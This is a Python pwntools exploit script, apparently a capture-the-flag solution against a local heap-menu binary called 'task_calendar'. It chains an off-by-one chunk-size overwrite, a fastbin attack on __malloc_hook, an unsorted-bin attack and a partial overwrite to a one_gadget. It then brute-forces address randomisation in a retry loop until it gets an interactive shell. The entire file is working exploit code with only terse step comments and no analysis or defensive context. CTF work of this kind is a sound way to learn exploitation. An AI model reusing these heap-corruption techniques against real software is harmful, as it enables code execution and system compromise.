from pwn import *
#context.log_level='debug'

#sh=process('./task_calendar')

def add(idx,size):
	sh.sendlineafter('>','1')
	sh.sendlineafter('>',str(idx))
	sh.sendlineafter('>',str(size))

def edit(idx,size,info):
	sh.sendlineafter('>','2')
	sh.sendlineafter('>',str(idx))
	sh.sendlineafter('>',str(size))
	sh.sendafter('>',info)

def dele(idx):
	sh.sendlineafter('>','3')
	sh.sendlineafter('>',str(idx))

def exp():	
	sh.recvuntil('input calendar name> ')
	sh.sendline('name')

	add(1,0x68)
	add(2,0x68)
	add(3,0x68)

	#------make chunk2 free to unsorted bin----------

	edit(3,0x68,p64(0)*2+p64(0x90)+p64(0x51)+'\n')
	edit(1,0x68,'a'*0x68+'\x91')
	#gdb.attach(sh)
	dele(2)
	#gdb.attach(sh)
	#----fastbin attack-----------------------------

	edit(1,0x68,'a'*0x68+'\x71')
	dele(1)
	dele(3)
	edit(3,1,'\x70\x70')
	edit(2,1,'\xfd\x1a')
	#gdb.attach(sh)
	#--fastbin[0x70]= chunk3-> chunk2 ->malloc_hook-13-----
	add(1,0x60)
	add(4,0x60)
	add(3,0x60)

	# fix fastbinY---------
	dele(4)
	edit(4,7,p64(0))
	#gdb.attach(sh)
	#----unsorted bin attack-------------------------

	add(1,0x60)
	edit(1,9,p64(0)+'\x00\x1b')
	add(1,0x60)

	#----edit malloc_hook to one_gadget--------------

	#one_off = 0xf66f0
	edit(3,5,'aaa\xa4\xd2\xaf')

	dele(4)
	dele(4)

for i in range(10000):
	sh = process('./task_calendar')
	try:
		exp()

		break;
	except:
		print i
		sh.close()	

sh.interactive()
